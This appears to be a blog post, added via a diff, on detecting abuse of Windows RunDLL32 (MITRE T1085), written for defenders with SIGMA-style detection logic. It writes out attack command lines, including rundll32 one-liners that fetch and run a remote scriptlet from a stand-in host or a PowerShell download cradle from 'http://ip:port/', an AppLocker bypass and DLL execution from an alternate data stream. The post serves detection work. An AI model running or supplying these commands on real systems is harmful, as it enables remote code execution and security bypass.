@@ -1,0 +1,133 @@
+---
+layout: post
+title: Detecting RunDLL32 ATT&amp;CK Techniques
+date: 2020-06-28 15:20:00.000000000 -04:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- ATT&amp;CK Detection
+tags:
+- ATT&amp;CK
+- Detection
+- LOLBINS
+meta:
+  _wpas_skip_21008142: '1'
+  _wp_old_date: '2020-07-01'
+  timeline_notification: '1593371885'
+  _publicize_job_id: '45964101980'
+  _g_feedback_shortcode_d19880efda6c951cf284409705cf9fd7503e0938: '[contact-field
+    label="Name" type="name" required="1"/][contact-field label="Email" type="email"
+    required="1"/][contact-field label="Comment" type="textarea" required="1"/]'
+  _g_feedback_shortcode_atts_d19880efda6c951cf284409705cf9fd7503e0938: a:10:{s:2:"to";s:19:"amskatoff@gmail.com";s:7:"subject";s:39:"[]
+    Detecting RunDLL32 ATT&CK Techniques";s:12:"show_subject";s:2:"no";s:6:"widget";i:0;s:2:"id";i:208;s:18:"submit_button_text";s:6:"Submit";s:14:"customThankyou";s:0:"";s:21:"customThankyouMessage";s:30:"Thank
+    you for your submission!";s:22:"customThankyouRedirect";s:0:"";s:10:"jetpackCRM";b:1;}
+  wordads_ufa: s:wpcom-ufa-v3-beta:1666774176
+  _last_editor_used_jetpack: block-editor
+  _elasticsearch_data_sharing_indexed_on: '2024-11-18 13:39:53'
+author:
+  login: amskatoff897216341
+  email: amskatoff@gmail.com
+  display_name: Andrew Skatoff
+  first_name: Andrew
+  last_name: Skatoff
+permalink: "/2020/06/28/detecting-rundll32-attck-techniques/"
+---
+<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
+<!-- wp:paragraph --><html><body></p>
+<p>Launching a strange binary file on a target endpoint is a good way to raise alarm bells within the target organization's SOC. One of the more common #LOLBINS we see is to use RunDLL32.exe to execute malicious DLL files. This technique is well documented in MITRE's ATT&amp;CK framework under <a rel="noreferrer noopener" href="https://attack.mitre.org/techniques/T1085/" target="_blank">T1085</a>.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>In this post, we look at detection approaches for 4 sub-techniques. In each case the assumption is that you are logging command execution with <a href="https://www.blackhillsinfosec.com/getting-started-with-sysmon/" target="_blank" rel="noreferrer noopener">Sysmon</a> or at least <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing" target="_blank" rel="noreferrer noopener">EventID 4688</a> (process execution with command lines). </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:verse --></p>
+<pre class="wp-block-verse"><em>Note: Credit for items #1 and #2 goes to the brilliant folks at <a rel="noreferrer noopener" href="https://lolbas-project.github.io/lolbas/Binaries/Rundll32/" target="_blank">https://lolbasproject.github.io/lolbas</a>.</em></pre>
+<p><!-- /wp:verse --></p>
+<p><!-- wp:heading --></p>
+<h2>SubTechnique 1 - Javascript ActiveX Objects</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Executing simple Javascript downloader.<br><em>This behavior has been used by malware such as <a rel="noreferrer noopener" href="https://www.vmray.com/cyber-security-blog/poweliks-fileless-malware-analysis/" target="_blank">Poweliks</a>.</em></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" </pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p>Executing Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p>Using Rundll32.exe to execute a JavaScript script that runs calc.exe. This will bypass AppLocker even if calc.exe is not on the allowed list.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p>Executing Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p><span style="text-decoration:underline">SIGMA Friendly Detection Logic:</span></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>image=rundll32.exe AND commandLine="*ActiveXObject*"  OR   commandLine="*WScript.Shell*" OR commandLine="*RunHTMLApplication*”</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2>SubTechnique 2 - Alternate data streams</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p><span style="text-decoration:underline">SIGMA Friendly Detection Logic:</span></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>image=rundll32.exe  | <span style="color:#9fa300" class="has-inline-color">regex</span> commandLine="/^rundll32.+\:.+\..+$/"</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2>SubTechnique 3 – Point Function Call</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>RunDll32 can be used to launch an executable via the <a rel="noreferrer noopener" href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function" target="_blank">PointFunctionCall</a> operation. This technique was used by a suspected <a href="https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html" target="_blank" rel="noreferrer noopener">APT group</a> (APT29).<br></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">"C:\Windows\system32\rundll32.exe"  C:\Users\Administrator\AppData\Local\cyzfc.dat, PointFunctionCall</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p><span style="text-decoration:underline">SIGMA Friendly Detection Logic:</span></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>image=rundll32.exe  AND commandLine="*PointFunctionCall*"</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2>SubTechnique 4 – Network HTTP(s) call for additional payloads</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Rundll32 can be used to launch a custom DLL that pulls down malware from the internet. The example below is used by <a href="https://malwaretips.com/blogs/remove-my-forms-finder-by-myway/">Slimware PUA</a>.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">Rundll32.exe "C:\Users\*\AppData\Local\OnlineFormFinderTooltab\TooltabExtension.dll",A -hp=https://hp.myway.com/onlineformfinder/ttab02/index.html -ua="(Windows NT 10.0; Win64; MSIE 11.1747; Build 16299; SP 0)" -ul=https://anx.mindspark.com/anx.gif?anxa=%251&amp;anxe=%252&amp;anxt=CE87BC6F-A080-40BF-8E3B-4EE1C18EDBB7&amp;anxtv=2.7.1.3000&amp;anxp=^CPW^xdm373^TTAB02^us&amp;anxsi=&amp;anxv=%253&amp;anxd=2020-04-01&amp;anxr=%254 -hu=SHOW</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p><span style="text-decoration:underline">SIGMA Friendly Detection Logic:</span></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>image=rundll32.exe  (commandLine="*\\users\\*http*." AND NOT commandLine=*<em>yourdomain</em>.com*)</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>References:</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>- <a rel="noreferrer noopener" href="https://lolbas-project.github.io/lolbas/Binaries/Rundll32/" target="_blank">https://lolbas-project.github.io/lolbas/Binaries/Rundll32</a><br>- <a rel="noreferrer noopener" href="https://attack.mitre.org/techniques/T1085/" target="_blank">https://attack.mitre.org/techniques/T1085/</a><br>- <a rel="noreferrer noopener" href="https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html" target="_blank">https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html</a></p>
+<p><!-- /wp:paragraph --><br />
+</body></html></p>
